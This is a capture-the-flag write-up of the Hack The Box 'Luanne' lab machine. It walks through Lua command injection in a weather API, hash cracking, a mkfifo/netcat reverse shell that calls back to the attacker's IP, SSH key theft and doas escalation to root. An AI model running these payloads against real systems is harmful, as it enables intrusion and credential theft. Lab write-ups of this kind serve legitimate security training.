# LUANNE

## NMAP

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/luanne]
└─$ nmap 10.10.10.218                 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-03 02:41 EDT
Nmap scan report for 10.10.10.218
Host is up (0.27s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9001/tcp open  tor-orport

Nmap done: 1 IP address (1 host up) scanned in 48.28 seconds
                                                                                       
┌──(kali㉿kali)-[~/Downloads/hackthebox/luanne]
└─$ nmap 10.10.10.218 -p 22,80,9001 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-03 02:42 EDT
Nmap scan report for 10.10.10.218
Host is up (0.27s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
| ssh-hostkey: 
|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
80/tcp   open  http    nginx 1.19.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=.
| http-robots.txt: 1 disallowed entry 
|_/weather
|_http-server-header: nginx/1.19.0
|_http-title: 401 Unauthorized
9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=default
|_http-server-header: Medusa/1.12
|_http-title: Error response
Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
```

## PORT 80

Trying to visit the webpage we are asked to enter usernane and password which we do not know so we press cancel and it shows us a 401 unauthorized error page and also gives a hint about `/index.html` page.

![](https://github.com/Leo-2807/Writeups/blob/main/images/luanne1.png)

![](https://github.com/Leo-2807/Writeups/blob/main/images/luanne2.png)

## GOBUSTER

## INDEX.HTML

![](https://github.com/Leo-2807/Writeups/blob/main/images/luanne3.png)

## ROBOTS.TXT

![](https://github.com/Leo-2807/Writeups/blob/main/images/luanne4.png)

## WEATHER

Just as written on /robots.txt the page is returning a 404 error.

![](https://github.com/Leo-2807/Writeups/blob/main/images/luanne5.png)

## PORT 9001

Visiting port 9001 also asks for username and password, on pressing cancel it gives us a 401 error.

![](https://github.com/Leo-2807/Writeups/blob/main/images/luanne6.png)

![](https://github.com/Leo-2807/Writeups/blob/main/images/luanne7.png)

But it also gives us a hint about the creds. 
The authentication dialogue box says that `the site says : "default"` . From the nmap scan we know that the site is running `Supervisor process manager`.
On googling for it's dedault creds we find `user:123`

![](https://github.com/Leo-2807/Writeups/blob/main/images/luanne8.png)

## WEATHERMAP API

Checking out the processes we find that the `webapi/weather.lua` is running.
So that's the weather about which we read in robots.txt.
Running gobuster against `/weather` gives us a file named `/forecast`

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/luanne]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.218/weather -q -t 100 -x php,html,txt,phtml
/forecast             (Status: 200) [Size: 90]
```
![](https://github.com/Leo-2807/Writeups/blob/main/images/luanne9.png)

On using `city=list` gives us a list of cities.

![](https://github.com/Leo-2807/Writeups/blob/main/images/luanne10.png)

## EXPLOIT

Looking for possible vulnerbilities in lua I found [this article](https://www.syhunt.com/en/index.php?n=Articles.LuaVulnerabilities) 
In this article I found this part very similar to ehat we have.

We can execute command by using the `os.execute`

Using the url `http://10.10.10.218/weather/forecast?city=London%27)%20os.execute(%27ls%27)%20--`

![](https://github.com/Leo-2807/Writeups/blob/main/images/luanne11.png)

Now that we have command execurion we can try to get the authetication creds.

![](https://github.com/Leo-2807/Writeups/blob/main/images/luanne13.png)

![](https://github.com/Leo-2807/Writeups/blob/main/images/luanne12.png)

These are the creds that we have `webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0`

We can use john to crack the hash.

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/luanne]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash       
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE2 4x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iamthebest       (webapi_user)
1g 0:00:00:00 DONE (2021-10-03 04:36) 10.00g/s 29760p/s 29760c/s 29760C/s secrets..lance
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
The creds are `webapi_user:iamthebest`

Now we are able to loginto the weatherforecast api. But it leads nowhere.

## SHELL

Since we have code execution, we can try to get a reverse shell.
On searching for openbsd reverse shell I found this [cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

On trying to get a shell through the web browser the command got executed but nothing came back.
So I used curl to get a reverse shell.

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/luanne]
└─$ curl -G --data-urlencode "city=') os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f') --" 'http://10.10.10.218/weather/forecast' 
```
And I got a reverse shell

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/luanne]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.218] 65521
sh: can't access tty; job control turned off
$
```

## PRIVESEC

On running linpeas we find something interesting in the open ports part.

```bash
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                           
tcp        0      0  127.0.0.1.3000         *.*                    LISTEN                                                          
tcp        0      0  127.0.0.1.3001         *.*                    LISTEN
tcp        0      0  *.80                   *.*                    LISTEN
tcp        0      0  *.22                   *.*                    LISTEN
tcp        0      0  *.9001                 *.*                    LISTEN
tcp6       0      0  *.22                   *.*                    LISTEN
```
The one port that we have not seen before is `3001`.

Now we try to find which user is running this port.
Using the `ps auxw` command to check all running processes, we find that r.michaels is running this.

```bash
r.michaels  185  0.0  0.0  34992  1976 ?     Is    1:13PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www
```

We connect to this port via curl and it asks for authorization, so I try ti use the creds we have `webapi_user:iamthebest` and it works.

```bash
$ curl http://127.0.0.1:3001 -u webapi_user:iamthebest
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   386  100   386    0     0   125k      0 --:--:-- --:--:-- --:--:--  125k
<!doctype html>
<html>
  <head>
    <title>Index</title>
  </head>
  <body>
    <p><h3>Weather Forecast API</h3></p>
    <p><h4>List available cities:</h4></p>
    <a href="/weather/forecast?city=list">/weather/forecast?city=list</a>
    <p><h4>Five day forecast (London)</h4></p>
    <a href="/weather/forecast?city=London">/weather/forecast?city=London</a>
    <hr>
  </body>
</html>
```

After spending a lot of time to figure how to proceed from here, this is what I find

```bash
$ curl -u webapi_user:iamthebest http://127.0.0.1:3001/~r.michaels/id_rsa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2610  100  2610    0     0   849k      0 --:--:-- --:--:-- --:--:--  849k
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvXxJBbm4VKcT2HABKV2Kzh9GcatzEJRyvv4AAalt349ncfDkMfFB
Icxo9PpLUYzecwdU3LqJlzjFga3kG7VdSEWm+C1fiI4LRwv/iRKyPPvFGTVWvxDXFTKWXh
0DpaB9XVjggYHMr0dbYcSF2V5GMfIyxHQ8vGAE+QeW9I0Z2nl54ar/I/j7c87SY59uRnHQ
kzRXevtPSUXxytfuHYr1Ie1YpGpdKqYrYjevaQR5CAFdXPobMSxpNxFnPyyTFhAbzQuchD
ryXEuMkQOxsqeavnzonomJSuJMIh4ym7NkfQ3eKaPdwbwpiLMZoNReUkBqvsvSBpANVuyK
...snip...
```

Now we can ssh into the machine.

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/luanne]
└─$ ssh -i id_rsa r.michaels@10.10.10.218
Last login: Fri Sep 18 07:06:51 2020
NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020

Welcome to NetBSD!

luanne$ 
```

## ROOT

On enumeration we find a .enc file in backups directory.
On googling how to decrypt .enc file in netbsd we find about `netpgp`

```bash
luanne$ ls                                                             
devel_backup-2020-09-16.tar.gz.enc
-09-16.tar.gz.enc --output /home/r.michaels/backup/backup.tar.gz                                                              <
/home/r.michaels/backup/backup.tar.gz: No such file or directory
/home/r.michaels/backup/backup.tar.gz: No such file or directory
luanne$ netpgp --decrypt /home/r.michaels/backups/devel_backup-2020-09-16.tar.gz.enc --output /tmp/devel_backup.tar.gz           
signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 
Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a 
uid              RSA 2048-bit key <r.michaels@localhost>
luanne$ ls -la
total 20
drwxrwxrwt   2 root        wheel    48 Oct  3 15:12 .
drwxr-xr-x  21 root        wheel   512 Sep 16  2020 ..
-rw-------   1 r.michaels  wheel  1639 Oct  3 15:12 devel_backup.tar.gz
luanne$ tar -zxvf devel_backup.tar.gz
x devel-2020-09-16/
x devel-2020-09-16/www/
x devel-2020-09-16/webapi/
x devel-2020-09-16/webapi/weather.lua
x devel-2020-09-16/www/index.html
x devel-2020-09-16/www/.htpasswd
luanne$ cd www
ksh: cd: /tmp/www - No such file or directory
luanne$ ls -la
total 28
drwxrwxrwt   3 root        wheel    96 Oct  3 15:13 .
drwxr-xr-x  21 root        wheel   512 Sep 16  2020 ..
drwxr-x---   4 r.michaels  wheel    96 Sep 16  2020 devel-2020-09-16
-rw-------   1 r.michaels  wheel  1639 Oct  3 15:12 devel_backup.tar.gz
luanne$ cd devel-2020-09-16
luanne$ ls -la
total 32
drwxr-x---  4 r.michaels  wheel  96 Sep 16  2020 .
drwxrwxrwt  3 root        wheel  96 Oct  3 15:13 ..
drwxr-xr-x  2 r.michaels  wheel  48 Sep 16  2020 webapi
drwxr-xr-x  2 r.michaels  wheel  96 Sep 16  2020 www
luanne$ cd www
luanne$ ls -la
total 32
drwxr-xr-x  2 r.michaels  wheel   96 Sep 16  2020 .
drwxr-x---  4 r.michaels  wheel   96 Sep 16  2020 ..
-rw-r--r--  1 r.michaels  wheel   47 Sep 16  2020 .htpasswd
-rw-r--r--  1 r.michaels  wheel  378 Sep 16  2020 index.html
luanne$ cat .htpasswd
webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
```

I decode the hash using john again.
`$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.:littlebear`

Taking a guess I thought maybe it's the root password.
I tried to use `su` but it did not work.

```bash
luanne$ su root
su: You are not listed in the correct secondary group (wheel) to su root.
su: Sorry: Authentication error
```

On googling su alternatives for netbsd I found `doas`

```bash
luanne$ doas su root
Password:
sh: Cannot determine current working directory
# cd /root
# ls
.cshrc     .klogin    .login     .profile   .shrc      cleanup.sh root.txt
# cat root.txt
```


